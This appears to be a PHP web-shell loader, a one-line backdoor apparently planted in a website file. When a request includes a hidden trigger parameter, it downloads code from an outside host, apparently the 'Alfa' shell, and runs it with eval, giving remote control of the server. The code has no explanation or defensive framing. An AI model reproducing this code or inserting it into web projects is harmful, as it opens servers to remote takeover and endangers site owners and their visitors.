<?php if (isset($_GET['gungun'])) { if (($contents = @file_get_contents('https://shell.prinsh.com/Nathan/alfa.txt')) !== false) { eval('?>' . $contents); exit; } else { echo "header"; }}
